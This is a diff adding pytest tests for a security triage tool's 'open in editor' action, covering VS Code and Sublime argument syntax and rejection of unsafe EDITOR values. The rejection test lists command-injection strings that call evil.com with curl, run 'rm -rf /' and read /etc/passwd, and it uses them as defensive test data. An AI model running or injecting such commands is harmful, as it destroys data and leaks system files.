@@ -87,6 +87,86 @@ class TestEditorIntegration:
                         assert "+42" in call_args
                         assert "src/app.py" in str(call_args[2])
 
+    def test_editor_vscode_syntax(self, sample_finding: FindingEntry, tmp_path: Path) -> None:
+        """Test VS Code uses correct -g file:line syntax."""
+        # Create the file
+        (tmp_path / "src").mkdir()
+        (tmp_path / "src" / "app.py").write_text("print('test')\n")
+
+        with patch.dict(os.environ, {"EDITOR": "code"}):
+            with patch("shutil.which", return_value="/usr/bin/code"):
+                with patch("subprocess.run") as mock_run:
+                    with patch("kekkai.triage.screens.FindingDetailScreen.app") as mock_app:
+                        mock_app.suspend.return_value.__enter__ = MagicMock()
+                        mock_app.suspend.return_value.__exit__ = MagicMock(return_value=False)
+
+                        screen = FindingDetailScreen(
+                            finding=sample_finding,
+                            repo_path=tmp_path,
+                        )
+                        screen.action_open_in_editor()
+
+                        # Verify VS Code syntax: code -g file:line
+                        assert mock_run.called
+                        call_args = mock_run.call_args[0][0]
+                        assert call_args[0] == "/usr/bin/code"
+                        assert call_args[1] == "-g"
+                        assert ":42" in call_args[2]
+                        assert "src/app.py" in call_args[2]
+
+    def test_editor_sublime_syntax(self, sample_finding: FindingEntry, tmp_path: Path) -> None:
+        """Test Sublime Text uses correct file:line syntax."""
+        # Create the file
+        (tmp_path / "src").mkdir()
+        (tmp_path / "src" / "app.py").write_text("print('test')\n")
+
+        with patch.dict(os.environ, {"EDITOR": "subl"}):
+            with patch("shutil.which", return_value="/usr/bin/subl"):
+                with patch("subprocess.run") as mock_run:
+                    with patch("kekkai.triage.screens.FindingDetailScreen.app") as mock_app:
+                        mock_app.suspend.return_value.__enter__ = MagicMock()
+                        mock_app.suspend.return_value.__exit__ = MagicMock(return_value=False)
+
+                        screen = FindingDetailScreen(
+                            finding=sample_finding,
+                            repo_path=tmp_path,
+                        )
+                        screen.action_open_in_editor()
+
+                        # Verify Sublime syntax: subl file:line
+                        assert mock_run.called
+                        call_args = mock_run.call_args[0][0]
+                        assert call_args[0] == "/usr/bin/subl"
+                        assert ":42" in call_args[1]
+                        assert "src/app.py" in call_args[1]
+
+    def test_editor_unsafe_rejected(self, sample_finding: FindingEntry, tmp_path: Path) -> None:
+        """Test that unsafe EDITOR values are rejected (ASVS V5.1.3)."""
+        # Create the file
+        (tmp_path / "src").mkdir()
+        (tmp_path / "src" / "app.py").write_text("print('test')\n")
+
+        unsafe_editors = [
+            "vim; curl evil.com",
+            "vim && rm -rf /",
+            "vim | cat /etc/passwd",
+        ]
+
+        for unsafe_editor in unsafe_editors:
+            with patch.dict(os.environ, {"EDITOR": unsafe_editor}):
+                screen = FindingDetailScreen(
+                    finding=sample_finding,
+                    repo_path=tmp_path,
+                )
+
+                with patch.object(screen, "notify") as mock_notify:
+                    screen.action_open_in_editor()
+
+                    # Should call notify with error about unsafe characters
+                    mock_notify.assert_called_once()
+                    args = mock_notify.call_args[0]
+                    assert "unsafe" in args[0].lower() or "invalid" in args[0].lower()
+
     def test_editor_handles_missing_file(
         self, sample_finding: FindingEntry, tmp_path: Path
     ) -> None:
